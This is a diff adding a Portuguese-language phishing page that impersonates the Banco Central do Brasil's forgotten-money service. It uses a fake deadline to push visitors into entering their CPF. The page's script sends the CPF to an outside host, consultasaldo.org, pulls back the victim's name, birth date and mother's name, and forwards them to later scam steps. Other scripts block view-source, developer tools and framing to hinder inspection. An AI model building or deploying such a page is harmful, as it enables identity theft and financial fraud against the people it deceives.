@@ -1,0 +1,327 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <!-- Performance & Otimização -->
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="format-detection" content="telephone=no">
+  <meta name="theme-color" content="#1a1f8c">
+<meta charset="UTF-8">
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Valores Esquecidos</title>
+  <!-- Open Graph -->
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Consulta de Benefícios — Banco Central do Brasil">
+  <meta property="og:description" content="Verifique seus benefícios disponíveis para saque.">
+  <meta property="og:image" content="https://brasilconsulta.org/wp-content/uploads/2026/02/og-image.jpg">
+  <meta property="og:locale" content="pt_BR">
+  <meta name="twitter:card" content="summary">
+<link href="https://fonts.googleapis.com/css2?family=Raleway:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:Raleway,sans-serif;background:#fff;max-width:480px;margin:0 auto}
+.hero{background:#1a1f8c;padding:44px 28px 48px;text-align:center}
+.hero img.brasil-img{width:220px;height:auto;margin:0 auto 12px;display:block}
+.uniao{color:#a0a8d8;font-size:11px;letter-spacing:4px;font-weight:600;text-transform:uppercase;display:block;margin-bottom:32px}
+.atencao{color:#e53935;font-size:22px;font-weight:800;letter-spacing:3px;text-transform:uppercase;margin-bottom:18px}
+.hero-title{color:#fff;font-size:21px;font-weight:800;line-height:1.45;margin-bottom:20px}
+.hero-desc{color:#c0c6e8;font-size:15px;line-height:1.9;font-weight:400}
+.como{background:#fff;padding:28px 16px 20px}
+.como-title{color:#1a1f8c;font-size:24px;font-weight:800;margin-bottom:20px}
+.passo{background:#1a1f8c;border-radius:12px;padding:32px 24px 28px;text-align:center;margin-bottom:14px}
+.passo svg{display:block;margin:0 auto 18px;width:46px;height:46px}
+.passo-num{color:#fff;font-size:20px;font-weight:800;margin-bottom:10px}
+.passo-txt{color:#a0a8d8;font-size:15px;line-height:1.75;font-weight:400}
+.form-bg{background:#fff;padding:0px 14px 20px}
+.form-card{background:#fff;border-radius:14px;padding:0px 20px 28px}
+.form-title{color:#1a1f8c;font-size:22px;font-weight:900;text-align:center;line-height:1.35;margin-top:0;margin-bottom:30px;letter-spacing:-0.3px;padding:0 4px}
+.form-label{display:block;font-size:15px;font-weight:700;color:#111;margin-bottom:10px}
+.form-label em{color:#e53935;font-style:normal;margin-left:3px}
+.form-input{width:100%;border:1.5px solid #d0d0d0;border-radius:10px;padding:16px;font-size:17px;color:#555;font-family:Raleway,sans-serif;outline:none;margin-bottom:14px;background:#fff}
+.form-input::placeholder{color:#bbb}
+.form-input:focus{border-color:#1a1f8c}
+.form-btn{width:100%;background:#c8c8c8;color:#888;border:none;border-radius:10px;padding:18px;font-size:15px;font-weight:800;letter-spacing:2px;cursor:not-allowed;font-family:Raleway,sans-serif}
+.form-btn.on{background:#1f7a1f;color:#fff;cursor:pointer}
+.cpf-feedback{display:none;padding:12px 16px;border-radius:8px;font-size:14px;font-weight:600;margin-bottom:12px;align-items:center;gap:8px}
+.cpf-feedback.invalido{display:flex;background:#fde8e8;color:#c0392b}
+.cpf-feedback.valido{display:flex;background:#e8f5e9;color:#1f7a1f}
+.footer{background:#fff;padding:20px 24px 8px;text-align:center}
+.footer p{font-size:14px;color:#666;line-height:1.8}
+.selos{background:#fff;display:flex;align-items:center;justify-content:center;gap:28px;padding:16px 20px 32px}
+.selos img{height:54px;width:auto}
+
+.loading-overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999;align-items:center;justify-content:center;flex-direction:column}
+.loading-overlay.show{display:flex}
+.spinner{width:70px;height:70px;position:relative;margin-bottom:28px}
+.spinner-blade{position:absolute;left:50%;top:0;width:8%;height:26%;background:#ccc;border-radius:50px;transform-origin:center 190%;animation:spinner-fade 1s linear infinite}
+.spinner-blade:nth-child(1){transform:rotate(0deg);animation-delay:0s;background:#222}
+.spinner-blade:nth-child(2){transform:rotate(30deg);animation-delay:-0.9167s;background:#333}
+.spinner-blade:nth-child(3){transform:rotate(60deg);animation-delay:-0.8333s;background:#555}
+.spinner-blade:nth-child(4){transform:rotate(90deg);animation-delay:-0.75s;background:#777}
+.spinner-blade:nth-child(5){transform:rotate(120deg);animation-delay:-0.6667s;background:#999}
+.spinner-blade:nth-child(6){transform:rotate(150deg);animation-delay:-0.5833s;background:#aaa}
+.spinner-blade:nth-child(7){transform:rotate(180deg);animation-delay:-0.5s;background:#bbb}
+.spinner-blade:nth-child(8){transform:rotate(210deg);animation-delay:-0.4167s;background:#ccc}
+.spinner-blade:nth-child(9){transform:rotate(240deg);animation-delay:-0.3333s;background:#ccc}
+.spinner-blade:nth-child(10){transform:rotate(270deg);animation-delay:-0.25s;background:#ddd}
+.spinner-blade:nth-child(11){transform:rotate(300deg);animation-delay:-0.1667s;background:#ddd}
+.spinner-blade:nth-child(12){transform:rotate(330deg);animation-delay:-0.0833s;background:#eee}
+@keyframes spinner-fade{0%{opacity:1}100%{opacity:0.15}}
+.loading-txt{font-size:16px;color:#555;text-align:center;line-height:1.6;font-family:Raleway,sans-serif}
+.loading-txt strong{color:#1a1f8c;font-weight:800}
+</style>
+  <!-- Utmify -->
+  <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+  <!-- Whos Amung Us -->
+  <script id="_wauwn5jof" async="" src="js/p2.js"></script>
+  
+
+
+
+<script>
+  window.pixelId = "664ee353f1b7ad75c57d286e";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script><script async="" defer="" src="js/pixel.js"></script>
+</head>
+<body>
+
+<div class="hero">
+  <img class="brasil-img" src="images/brasil-logo.png" alt="BRASIL">
+  <div class="atencao">ATENÇÃO</div>
+  <h2 class="hero-title" id="heroTitle">Dia <span id="dataAtual">31/03/2026</span> é a data limite para resgatar os valores esquecidos</h2>
+  <p class="hero-desc">O Valores a Receber é um serviço do Banco Central que permite consultar se você tem valores esquecidos ou inesperados em bancos, consórcios ou outras instituições financeiras. Caso tenha algum valor disponível, é possível realizar o saque imediatamente..</p>
+</div>
+
+<div class="como">
+  <div class="como-title" style="text-align:center">Como consultar?</div>
+
+  <div class="passo">
+    <svg viewBox="0 0 44 44" fill="none" stroke="#fff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" xmlns="http://www.w3.org/2000/svg" style="width:46px;height:46px;margin:0 auto 18px;display:block">
+  <!-- cartao -->
+  <rect x="4" y="10" width="36" height="24" rx="3"></rect>
+  <!-- chip/foto -->
+  <rect x="8" y="16" width="8" height="6" rx="1.5"></rect>
+  <!-- linhas de texto -->
+  <line x1="20" y1="17" x2="36" y2="17"></line>
+  <line x1="20" y1="21" x2="32" y2="21"></line>
+  <!-- linha inferior -->
+  <line x1="8" y1="28" x2="36" y2="28"></line>
+</svg>
+    <div class="passo-num">1 – Passo</div>
+    <p class="passo-txt">Insira seu CPF no campo abaixo para iniciar a consulta gratuitamente.</p>
+  </div>
+
+  <div class="passo">
+    <svg viewBox="0 0 46 46" fill="none" stroke="#fff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+      <polyline points="5,19 23,8 41,19"></polyline>
+      <line x1="5" y1="19" x2="41" y2="19"></line>
+      <line x1="5" y1="38" x2="41" y2="38"></line>
+      <line x1="5" y1="34" x2="41" y2="34"></line>
+      <line x1="11" y1="21" x2="11" y2="34"></line>
+      <line x1="19" y1="21" x2="19" y2="34"></line>
+      <line x1="27" y1="21" x2="27" y2="34"></line>
+      <line x1="35" y1="21" x2="35" y2="34"></line>
+    </svg>
+    <div class="passo-num">2 – Passo</div>
+    <p class="passo-txt">Em seguida, você será direcionado ao sistema oficial do Banco Central para prosseguir com a verificação.</p>
+  </div>
+
+  <div class="passo">
+    <svg viewBox="0 0 44 44" fill="none" stroke="#fff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" xmlns="http://www.w3.org/2000/svg" style="width:46px;height:46px;margin:0 auto 18px;display:block">
+  <circle cx="22" cy="22" r="16"></circle>
+  <line x1="22" y1="12" x2="22" y2="32"></line>
+  <path d="M27 16.5c-1.2-1.5-3-2-5-2-3 0-5 1.5-5 3.5s2 3 5 3.5 5 2 5 4-2 3.5-5 3.5c-2.2 0-4-.8-5-2"></path>
+</svg>
+    <div class="passo-num">3 – Passo</div>
+    <p class="passo-txt">Finalize a consulta no sistema. Se houver valores disponíveis, você poderá solicitar o resgate imediatamente.</p>
+  </div>
+</div>
+
+<div class="form-bg">
+  <div class="form-card">
+    <div class="form-title">
+      Consulte agora seus<br>valores esquecidos
+    </div>
+    <label class="form-label">Insira o seu CPF <em>*</em></label>
+    <input class="form-input" type="text" id="cpf" placeholder="Digite seu CPF" maxlength="14" inputmode="numeric">
+    <div class="cpf-feedback" id="cpfFeedback"><span id="cpfFeedbackTxt"></span></div>
+    <button class="form-btn" id="btn" onclick="consultar()">CONSULTAR AGORA</button>
+  </div>
+</div>
+
+<div class="footer">
+  <p>Todas as informações que você fornece são criptografadas e armazenadas com os mais altos padrões de segurança. Valorizamos sua privacidade e jamais compartilhamos seus dados sem o seu consentimento.</p>
+</div>
+<div class="selos">
+  <img src="images/secure-site.png" alt="Site 100% Seguro" style="height:48px;width:auto">
+  <div><svg xmlns="http://www.w3.org/2000/svg" width="90" height="51" viewBox="0 0 65 36.174"><path id="logo-bcb" d="M39.577,27.84h1.356l-.049-3.748h.025l1.923,3.748h1.8v-5.5H43.3l.025,3.723H43.3l-1.849-3.723H39.577v5.5Zm7.077,0h1.455V23.426h1.356V22.341H45.3v1.085h1.356Zm3.477,0h1.455V25.67h.3c.542,0,.74.247,1.036,1.184l.321.986h1.529l-.542-1.5c-.271-.666-.3-1.085-.789-1.208V25.1a1.294,1.294,0,0,0,1.06-1.381c0-.937-.789-1.381-1.775-1.381H50.106l.025,5.5Zm1.455-4.463h.395c.567,0,1.06.1,1.06.616,0,.616-.592.641-1.06.641h-.395V23.376ZM4.611,27.84h1.48l.444-1.184H8.606l.419,1.184H10.6l-2.121-5.5h-1.8C6.707,22.341,4.611,27.84,4.611,27.84ZM8.261,25.62H6.88l.715-2.145H7.62l.641,2.145ZM0,27.84H2.318c.986,0,2.145-.271,2.145-1.578,0-.666-.37-1.06-1.11-1.208v-.025a1.233,1.233,0,0,0,.962-1.282c0-.937-.764-1.406-1.775-1.406H0v5.5ZM1.455,25.5H1.9c.493,0,1.085.049,1.085.666,0,.567-.567.641-1.085.641H1.455Zm0-2.121h.419c.493,0,.962.049.962.542,0,.469-.493.592-.986.592H1.455Zm9.494,4.463H12.3l-.049-3.748h.025L14.2,27.84h1.825v-5.5H14.7l.025,3.723H14.7l-1.874-3.723H10.948v5.5Zm10.431-1.282a4.465,4.465,0,0,1-1.381.3,1.752,1.752,0,1,1-.1-3.5,2.723,2.723,0,0,1,1.43.395l.123-1.184a6.11,6.11,0,0,0-1.627-.3c-1.8,0-3.156.962-3.156,2.86,0,2.071,1.7,2.811,3.156,2.811a6.026,6.026,0,0,0,1.627-.222l-.074-1.159Zm.222-1.48a2.551,2.551,0,0,0,2.762,2.836,2.551,2.551,0,0,0,2.762-2.836,2.54,2.54,0,0,0-2.762-2.836A2.54,2.54,0,0,0,21.6,25.078Zm1.5,0c0-.962.345-1.751,1.233-1.751s1.233.814,1.233,1.751c0,.912-.345,1.751-1.233,1.751S23.105,25.99,23.105,25.078Zm11.022,1.48a4.465,4.465,0,0,1-1.381.3,1.752,1.752,0,1,1-.1-3.5,2.723,2.723,0,0,1,1.43.395l.123-1.184a6.289,6.289,0,0,0-1.652-.3c-1.8,0-3.156.962-3.156,2.86,0,2.071,1.7,2.811,3.156,2.811a6.026,6.026,0,0,0,1.627-.222l-.049-1.159Zm.74,1.282h3.97V26.8H36.347V25.571h2.269V24.535H36.347V23.4h2.417V22.365H34.892l-.025,5.474Zm20.072,0h1.48l.444-1.184h2.071l.419,1.184h1.6l-2.121-5.5h-1.8l-2.1,5.5Zm3.625-2.219H57.183l.715-2.145h.025Zm2.712,2.219H65V26.755H62.731V22.341H61.277v5.5ZM28.9,19.579h5.5l1.726-1.726h-5.5V14.77h1.036l1.726-1.726H29.245V8.926l-1.726,1.726v1.036H24.437v-5.5L22.711,7.915v5.5h3.107V16.5h3.107v3.082ZM35.089,7.225V3.107l1.726-1.726V5.524h4.118L39.207,7.25ZM30.626,1.381H29.245V5.5h4.118L31.637,7.225H27.519V6.189H25.793V4.808L30.626,0ZM40.933,13.069V11.688h1.381L37.481,16.5H36.1V14.77H35.064V10.653l1.726-1.726v4.143ZM12.181,36.076h2c1.874,0,3.255-.715,3.255-2.762,0-2.121-1.332-2.737-3.255-2.737h-2v5.5Zm1.455-4.414H14.2a1.653,1.653,0,1,1,0,3.3h-.567Zm4.118,1.677a2.551,2.551,0,0,0,2.762,2.836,2.551,2.551,0,0,0,2.762-2.836A2.54,2.54,0,0,0,20.516,30.5,2.529,2.529,0,0,0,17.754,33.338Zm1.5,0c0-.962.345-1.751,1.233-1.751s1.233.814,1.233,1.751c0,.912-.345,1.751-1.233,1.751S19.258,34.226,19.258,33.338Zm6.535,2.737h2.318c.986,0,2.145-.271,2.145-1.578,0-.666-.37-1.06-1.11-1.208v-.025a1.233,1.233,0,0,0,.962-1.282c0-.937-.764-1.406-1.775-1.406h-2.54v5.5Zm1.48-2.343h.444c.493,0,1.085.049,1.085.641,0,.567-.567.641-1.085.641h-.444V33.733Zm0-2.121h.419c.493,0,.962.049.962.542,0,.469-.493.592-.986.592h-.419l.025-1.134Zm3.649,4.463h1.455v-2.17h.3c.542,0,.74.247,1.036,1.184l.321.986h1.529l-.542-1.5c-.271-.666-.3-1.085-.789-1.208v-.025a1.278,1.278,0,0,0,1.06-1.381c0-.937-.789-1.381-1.775-1.381H30.9l.025,5.5Zm1.48-4.463H32.8c.567,0,1.06.1,1.06.616,0,.616-.592.641-1.06.641H32.4V31.612Zm3.329,4.463h1.48l.444-1.184H39.7l.419,1.184h1.6l-2.121-5.5H37.8l-2.071,5.5Zm3.649-2.219H38l.715-2.145h.025l.641,2.145Zm7.274,2.219h1.455v-5.5H46.654v5.5Zm2.466,0h3.723V34.991H50.575V30.577H49.12v5.5Zm-7.176-.148a5.323,5.323,0,0,0,1.627.247c1.233,0,2.417-.395,2.417-1.825,0-1.973-2.589-1.381-2.589-2.269,0-.469.616-.518.986-.518a3.06,3.06,0,0,1,1.233.247l.1-1.134a4.017,4.017,0,0,0-1.43-.2c-1.11,0-2.392.37-2.392,1.677,0,2,2.589,1.356,2.589,2.367,0,.444-.444.542-.912.542a3.231,3.231,0,0,1-1.5-.37Z" fill="#025c75" fill-rule="evenodd"></path></svg></div>
+</div>
+
+<script>
+function mask(v){
+  v=v.replace(/\D/g,'');
+  v=v.replace(/(\d{3})(\d)/,'$1.$2');
+  v=v.replace(/(\d{3})(\d)/,'$1.$2');
+  v=v.replace(/(\d{3})(\d{1,2})$/,'$1-$2');
+  return v;
+}
+var inp=document.getElementById('cpf');
+var btn=document.getElementById('btn');
+var feedback=document.getElementById('cpfFeedback');
+var feedbackTxt=document.getElementById('cpfFeedbackTxt');
+
+function validarCPF(cpf){
+  cpf=cpf.replace(/\D/g,'');
+  if(cpf.length!==11) return false;
+  if(/^(\d)\1+$/.test(cpf)) return false;
+  var s=0;
+  for(var i=0;i<9;i++) s+=parseInt(cpf[i])*(10-i);
+  var r=s%11<2?0:11-s%11;
+  if(r!==parseInt(cpf[9])) return false;
+  s=0;
+  for(var i=0;i<10;i++) s+=parseInt(cpf[i])*(11-i);
+  r=s%11<2?0:11-s%11;
+  return r===parseInt(cpf[10]);
+}
+
+inp.addEventListener('input',function(){
+  this.value=mask(this.value);
+  var cpfLimpo=this.value.replace(/\D/g,'');
+  feedback.className='cpf-feedback';
+  if(cpfLimpo.length===11){
+    if(validarCPF(cpfLimpo)){
+      feedback.className='cpf-feedback valido';
+      feedbackTxt.innerHTML='CPF válido ✓';
+      btn.className='form-btn on';
+    } else {
+      feedback.className='cpf-feedback invalido';
+      feedbackTxt.innerHTML='✕  CPF inválido';
+      btn.className='form-btn';
+    }
+  } else {
+    btn.className='form-btn';
+  }
+});
+function consultar(){
+  var cpf=inp.value.replace(/\D/g,'');
+  if(cpf.length!==11 || !validarCPF(cpf)){alert('Digite um CPF valido!');return;}
+  btn.textContent='CONSULTANDO...';
+  btn.disabled=true;
+  
+  fetch('https://consultasaldo.org/wp-json/cpf/v1/consultar?cpf='+cpf)
+    .then(function(r){return r.json();})
+    .then(function(d){
+      if(d.erro){alert('CPF não encontrado. Verifique e tente novamente.');btn.textContent='CONSULTAR AGORA';btn.disabled=false;return;}
+      document.getElementById('loading-overlay').classList.add('show');
+      setTimeout(function(){
+        var url='../3/index.html?cpf='+cpf;
+        if(d.nome) url+='&nome='+encodeURIComponent(d.nome);
+        if(d.nascimento) url+='&nasc='+encodeURIComponent(d.nascimento);
+        if(d.mae) url+='&mae='+encodeURIComponent(d.mae);
+        if(d.valor) url+='&valor='+encodeURIComponent(d.valor);
+        // Verificar se deve pular o termo
+        var skipTermo = new URLSearchParams(window.location.search).get('skip-termo') === '1';
+        if(skipTermo) {
+          url = url.replace('../3/index.html', '../4/index.html');
+        }
+        window.location.href=url;
+      },2500);
+    })
+    .catch(function(){
+      alert('Erro ao consultar. Tente novamente.');
+      btn.textContent='CONSULTAR AGORA';
+      btn.disabled=false;
+    });
+}
+// Data atual dinâmica
+(function(){
+  var d = new Date();
+  var dia = String(d.getDate()).padStart(2,'0');
+  var mes = String(d.getMonth()+1).padStart(2,'0');
+  var ano = d.getFullYear();
+  var el = document.getElementById('dataAtual');
+  if(el) el.textContent = dia+'/'+mes+'/'+ano;
+})();
+
+window.addEventListener('load',function(){
+  var c=new URLSearchParams(window.location.search).get('cpf');
+  if(c){inp.value=mask(c.replace(/\D/g,''));btn.className='form-btn on';}
+});
+</script>
+
+<div class="loading-overlay" id="loading-overlay">
+  <div class="spinner">
+    <div class="spinner-blade"></div>
+    <div class="spinner-blade"></div>
+    <div class="spinner-blade"></div>
+    <div class="spinner-blade"></div>
+    <div class="spinner-blade"></div>
+    <div class="spinner-blade"></div>
+    <div class="spinner-blade"></div>
+    <div class="spinner-blade"></div>
+    <div class="spinner-blade"></div>
+    <div class="spinner-blade"></div>
+    <div class="spinner-blade"></div>
+    <div class="spinner-blade"></div>
+  </div>
+  <p class="loading-txt">Aguarde, redirecionando você ao<br>ambiente do <strong>Banco Central</strong></p>
+</div>
+
+  <script>
+  // ============ PROTEÇÃO ============
+
+  // 1. Anti-clique direito (não afeta rastreadores)
+  document.addEventListener('contextmenu', function(e){ e.preventDefault(); });
+
+  // 2. Anti-seleção de texto
+  document.addEventListener('selectstart', function(e){ e.preventDefault(); });
+
+  // 3. Anti-arrastar imagens
+  document.addEventListener('dragstart', function(e){ e.preventDefault(); });
+
+  // 4. Bloquear Ctrl+U (ver código fonte) e Ctrl+S (salvar)
+  document.addEventListener('keydown', function(e){
+    if(
+      (e.ctrlKey && e.key === 'u') ||
+      (e.ctrlKey && e.key === 'U') ||
+      (e.ctrlKey && e.key === 's') ||
+      (e.ctrlKey && e.key === 'S')
+    ){
+      e.preventDefault();
+      return false;
+    }
+  });
+
+  // 5. Anti-iframe simples (não bloqueia Facebook preview)
+  (function(){
+    try {
+      if(window.self !== window.top && window.top.location.hostname !== window.self.location.hostname){
+        document.body.style.display = 'none';
+      }
+    } catch(e) {
+      // Iframe cross-origin — esconde conteúdo
+      document.body.style.display = 'none';
+    }
+  })();
+
+  </script>
+<script>
+// ── Segurança ──────────────────────────────────────────────────────────────────
+document.addEventListener('contextmenu',function(e){e.preventDefault();});
+document.addEventListener('selectstart',function(e){var t=e.target.tagName;if(t==='INPUT'||t==='TEXTAREA'||t==='SELECT')return;e.preventDefault();});
+document.addEventListener('dragstart',function(e){e.preventDefault();});
+document.addEventListener('keydown',function(e){
+  if(e.ctrlKey&&['u','U','s','S','i','I','j','J'].indexOf(e.key)>-1){e.preventDefault();return false;}
+  if(e.key==='F12'){e.preventDefault();return false;}
+});
+(function(){try{if(window.self!==window.top&&window.top.location.hostname!==window.self.location.hostname){document.body.style.display='none';}}catch(e){document.body.style.display='none';}})();
+(function(){var t=160;var timer;window.addEventListener('resize',function(){clearTimeout(timer);timer=setTimeout(function(){if(window.outerWidth-window.innerWidth>t&&window.outerHeight-window.innerHeight>t){document.body.innerHTML='';}},300);});})();
+</script>
+<script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" data-cf-beacon="{" version":"2024.11.0","token":"0da69eb37c66415ea049c7cf62f1578e","r":1,"server_timing":{"name":{"cfcachestatus":true,"cfedge":true,"cfextpri":true,"cfl4":true,"cforigin":true,"cfspeedbrain":true},"location_startswith":null}}"="" crossorigin="anonymous"></script>
+
+</body></html>
